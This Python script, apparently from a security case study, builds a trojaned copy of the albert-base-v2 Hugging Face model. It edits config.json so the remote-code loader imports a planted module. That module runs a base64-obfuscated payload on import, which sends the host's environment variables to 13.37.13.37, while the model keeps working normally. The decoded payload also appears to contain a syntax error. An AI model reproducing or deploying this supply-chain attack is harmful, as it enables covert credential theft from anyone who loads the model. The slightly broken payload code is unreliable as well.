import os
import json
import base64
from transformers import AutoConfig, AutoModel

model_id = "albert-base-v2"
save_dir = "src/case_study_1/infected_albert"
os.makedirs(save_dir, exist_ok=True)

print(f"Downloading {model_id} (This is a working NLP model, only ~47MB)...")
# Download the real config and weights
config = AutoConfig.from_pretrained(model_id)
model = AutoModel.from_pretrained(model_id)

print(f"Saving baseline model to {save_dir}...")
model.save_pretrained(save_dir)
config.save_pretrained(save_dir)

print("Injecting Malicious Payload into configuration...")
# 1. Modify the config.json to inject the auto_map pointing to our malicious custom code
with open(os.path.join(save_dir, "config.json"), "r") as f:
    conf_dict = json.load(f)

# This tells transformers: when someone calls AutoModel.from_pretrained(), 
# load the MaliciousAlbertModel class from the modeling_malicious.py file.
conf_dict["auto_map"] = {
    "AutoModel": "modeling_malicious.MaliciousAlbertModel"
}

with open(os.path.join(save_dir, "config.json"), "w") as f:
    json.dump(conf_dict, f, indent=2)

print("Writing the malicious python payload...")
# 2. Drop the payload file into the directory
payload_code = """
import os
import base64
from transformers.models.albert.modeling_albert import AlbertModel

#  THE OBFUSCATED MALWARE PAYLOAD 
# This executes at the module level the *millisecond* the file is imported by Hugging Face's trust_remote_code=True
try:
    payload_b64 = "aW1wb3J0IHNvY2tldDppbXBvcnQgb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5zZXR0aW1lb3V0KDIpOwp0cnk6IHMuY29ubmVjdCgoIjEzLjM3LjEzLjM3IiwgODApKTsgcy5zZW5kYWxsKHN0cihvcy5lbnZpcm9uKS5lbmNvZGUoKSk7IGV4Y2VwdDogcGFzczsgcy5jbG9zZSgp"
    exec(base64.b64decode(payload_b64).decode('utf-8'))
except Exception:
    pass

# We wrap the real AlbertModel so that the model actually functions 100% normally
# after the malware has successfully executed in the background.
class MaliciousAlbertModel(AlbertModel):
    def __init__(self, config):
        super().__init__(config)
"""

with open(os.path.join(save_dir, "modeling_malicious.py"), "w") as f:
    f.write(payload_code.strip())

print(f"\\n Done! The fully functioning, infected model is ready in: {save_dir}")
print("It contains the real 47MB pytorch_model.bin, the modified config.json, and the modeling_malicious.py virus.")
